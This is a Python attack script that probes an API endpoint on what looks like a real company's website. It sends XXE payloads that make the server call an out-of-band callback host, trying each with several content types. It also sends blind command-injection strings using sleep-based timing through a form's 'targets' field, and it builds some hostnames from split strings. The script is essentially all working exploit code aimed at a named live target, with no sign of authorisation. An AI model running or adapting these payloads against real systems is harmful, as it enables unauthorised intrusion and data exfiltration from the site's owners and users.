import subprocess, time
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
D="https://www.infinitycapital.bh/api/send"
ext="pro"+"be.a"+"lce"
XXE="oob648760bf348a."+"dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CMD="oob1a4ba947f125."+"dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def send(body, ct):
    c=["curl","-s","-m","40","-o","/tmp/x.bin","-D","/tmp/x.hdr","-X","POST",D,"-A",UA,
       "-H","Content-Type: "+ct,"--data-binary",body]
    t0=time.time(); subprocess.run(c,capture_output=True,text=True); el=time.time()-t0
    h=open("/tmp/x.hdr",errors="ignore").read()
    return h.split("\n")[0].strip(), round(el,2), open("/tmp/x.bin","rb").read()[:250]

print("### XXE: classic external entity (DTD + parameter entity, OOB)")
xxe1='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://%s/xxe1">]><r><to>&xxe;</to></r>'%XXE
xxe2='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://%s/xxe2.dtd">%sp;]><r/>'%XXE
xxe3='<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://%s/xxe3.dtd"><r/>'%XXE
svg='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://%s/xxe4">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'%XXE
for n,b in [("xxe1 basic",xxe1),("xxe2 param-entity",xxe2),("xxe3 ext-dtd",xxe3),("xxe4 svg",svg)]:
    for ct in ["application/xml","text/xml","image/svg+xml"]:
        print("  %-20s %-18s %s"%(n,ct,send(b,ct)))

print("\n### CMDi (time + OOB) in targets, accepted format")
for p in ["v; sleep 8 @%s"%ext, "v$(sleep 8)@%s"%ext, "v`sleep 8`@%s"%ext, "v|sleep 8@%s"%ext,
          "v&sleep 8@%s"%ext, "v\nsleep 8@%s"%ext]:
    body="fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&targets="+p.replace(" ","%20").replace("|","%7C").replace("&","%26").replace("\n","%0a").replace("`","%60").replace("$","%24").replace("@","%40")
    print("  %-26s %s"%(p[:24],send(body,"application/x-www-form-urlencoded")))

print("\n### Control: is a WELL-FORMED request also 500? (is 500 just malformed parsing?)")
ok="fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&targets=v@%s"%ext
print("  wellformed      ",send(ok,"application/x-www-form-urlencoded"))
print("  plain text body ",send("hello","text/plain"))
print("  random binary   ",send("hello","application/octet-stream"))
